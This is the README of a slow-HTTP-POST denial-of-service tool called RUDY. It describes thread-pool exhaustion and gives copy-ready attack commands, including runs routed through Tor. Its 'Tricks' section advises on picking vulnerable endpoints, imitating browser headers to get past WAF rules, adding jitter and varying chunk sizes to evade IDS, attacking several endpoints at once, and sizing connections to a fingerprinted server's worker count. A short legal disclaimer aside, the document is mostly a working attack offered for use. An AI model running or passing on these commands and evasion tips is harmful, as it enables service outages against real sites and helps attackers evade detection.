# RUDY — R-U-Dead-Yet?

Advanced Low-and-Slow HTTP POST denial-of-service research tool.  
Authorized penetration testing and security research only.

---

## Legal Notice

This tool is intended exclusively for authorized security testing, academic research, and controlled lab environments. Running this tool against systems without explicit written permission from the owner is illegal under computer fraud and abuse laws in most jurisdictions. The author assumes no liability for misuse.

---

## How It Works

RUDY exploits the way HTTP/1.1 servers allocate a dedicated worker thread (or process) per incoming connection. The attack proceeds as follows:

1. A TCP connection is established to the target.
2. A valid HTTP POST request is sent with a large `Content-Length` declared.
3. The request body is dripped at one byte per interval (default: 10 seconds), keeping the server thread occupied indefinitely.
4. Repeating this across many concurrent connections exhausts the server thread pool, causing legitimate requests to queue and eventually time out.

The attack is inherently stealthy. Because no request ever completes, standard access logs record nothing until a server-side timeout fires.

---

## Installation

No external dependencies are required. The tool uses Python standard library only.

**Requirements:** Python 3.8 or later.

```bash
git clone https://github.com/rafosw/rudy.git
cd rudy
python3 rudy.py --help
```

---

## Usage

```
python3 rudy.py [options]
```

### Core Options

| Flag | Description | Default |
|---|---|---|
| `-u URL` | Target URL | — |
| `--url-file FILE` | File containing target URLs, one per line | — |
| `-c N` | Number of concurrent connections | 1 |
| `-p SIZE` | Declared payload size (e.g. `1MB`, `500KB`) | 1MB |
| `-i SECONDS` | Interval between each dripped byte | 10 |
| `-j SECONDS` | Timing jitter applied per interval | 1.0 |

### Attack Mode Options

| Flag | Description |
|---|---|
| `--drip-headers` | Slowloris mode: drip HTTP headers line by line instead of the body |
| `--adaptive` | Automatically slow down on `429`/`503` responses, speed up on `200` |
| `--chunk-min N` | Minimum bytes per body chunk |
| `--chunk-max N` | Maximum bytes per body chunk |

### Network Options

| Flag | Description |
|---|---|
| `-t ENDPOINT` | TOR or SOCKS5 proxy (`socks5://host:port`) |
| `--proxy URL` | HTTP proxy (`http://host:port`) |
| `--retries N` | Maximum reconnection attempts per thread |

### Output Options

| Flag | Description |
|---|---|
| `--log FILE` | Write events to a JSON log file |
| `--report FILE` | Save an attack summary report on exit |
| `--stats-iv N` | Dashboard refresh interval in seconds |
| `--no-color` | Disable ANSI color output |

---

## Custom Headers

Use `-H` to inject arbitrary HTTP headers into each request. Pass the flag multiple times for multiple headers. This is useful when targeting endpoints that require authentication cookies, CSRF tokens, or specific content types.

```bash
python3 rudy.py -u "https://target.com/submit" \
  -H "Cookie: session=abc123; csrf=xyz" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: application/json" \
  -c 50 -p 2MB -i 8
```

---

## Custom POST Data

Use `-d` to specify the beginning of the POST body. The tool appends random padding bytes to reach the declared `Content-Length`. This allows targeting specific form fields while still executing the slow-body attack.

```bash
python3 rudy.py -u "https://target.com/login" \
  -d "username=admin&password=test&submit=1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c 50 -p 1MB -i 10
```

---

## Effective Usage

**Minimum viable attack against a limited-worker server:**
```bash
python3 rudy.py -u "http://target.com/upload" -c 20 -p 5MB -i 10
```

**Slowloris variant (drip headers, no body):**
```bash
python3 rudy.py -u "http://target.com/" -c 50 -i 5 --drip-headers
```

**Adaptive mode against rate-limited endpoints:**
```bash
python3 rudy.py -u "https://target.com/api/login" -c 100 -i 8 --adaptive
```

**Via TOR for anonymity:**
```bash
python3 rudy.py -u "http://target.com/" -c 30 -t socks5://127.0.0.1:9050
```

**Multi-target from file:**
```bash
python3 rudy.py --url-file targets.txt -c 20 -p 2MB -i 10
```

**With full logging:**
```bash
python3 rudy.py -u "http://target.com/" -c 50 --log events.json --report summary.json
```

### Tuning Guidance

- Set `-c` to at least `MaxRequestWorkers` (Apache) or `worker_connections` (Nginx) of the target, plus a margin.
- Use `-p 5MB` or larger for servers with generous body read limits.
- Lower `-i` values (e.g. `3`) are more aggressive but more detectable. Higher values (e.g. `15`) are stealthier.
- Use `--chunk-max 3` to vary packet sizes and evade signature-based detection.
- Combine `--adaptive` with `--drip-headers` for maximum evasion.

---

## Tricks

**Identify the right endpoint before attacking.**  
The most vulnerable endpoints are those that read the entire request body before responding — file upload forms, login handlers, search endpoints, and API routes that process JSON. Static pages served directly by a CDN or a reverse proxy cache are immune. Use Burp Suite or browser devtools to identify POST endpoints that have noticeable server-side processing delay.

**Match your headers to real browser traffic.**  
Use `-H` to replicate the exact headers seen in a legitimate browser request (captured via Burp Suite or DevTools Network tab). This bypasses basic WAF rules that block requests with missing or suspicious headers such as absent `User-Agent`, `Referer`, or `Accept-Language` fields.

```bash
python3 rudy.py -u "https://target.com/api/submit" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Referer: https://target.com/form" \
  -H "Origin: https://target.com" \
  -H "Content-Type: application/json" \
  -c 50 -p 2MB -i 8
```

**Declare a payload size larger than the server's body size limit.**  
If the target has a maximum body size (e.g. Nginx `client_max_body_size 10m`), declare `-p 12MB`. The server will accept the connection and wait for data up to its limit, giving you more time per thread before it closes the connection.

**Combine with a real form payload using `-d`.**  
Servers that validate form fields early (before reading the full body) will process your custom data and wait for the remainder. This keeps the thread alive while also triggering application-level logic, increasing resource consumption beyond just the network layer.

```bash
python3 rudy.py -u "https://target.com/upload" \
  -d "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.bin\"\r\n\r\n" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  -p 50MB -c 30 -i 12
```

**Layer multiple attack sessions.**  
Open several terminal sessions each targeting different endpoints of the same host simultaneously. A server may withstand the thread exhaustion on `/login` but collapse when `/upload`, `/search`, and `/api/data` are hit concurrently.

**Use jitter to avoid pattern-based rate limiting.**  
Most WAFs and IDS systems detect constant-interval flows. Set `-j 3.0` with a moderate `-i 10` so each connection sends bytes at a slightly different pace, making the traffic pattern appear as slow network conditions rather than an attack.

**Detect success without curl.**  
Instead of `curl`, open the target URL in a browser while the attack is running. A browser timeout or a spinning tab with no response after 5–10 seconds confirms thread exhaustion. Browser DevTools will show the connection in a pending state indefinitely.

**Read server response headers before attacking.**  
Check `Server:`, `X-Powered-By:`, and `X-AspNet-Version:` headers on the target. Apache with default `MaxRequestWorkers 150` is far more vulnerable than Nginx with `worker_connections 1024`. Adjust `-c` accordingly — aim for at least 110% of the declared worker count.

---
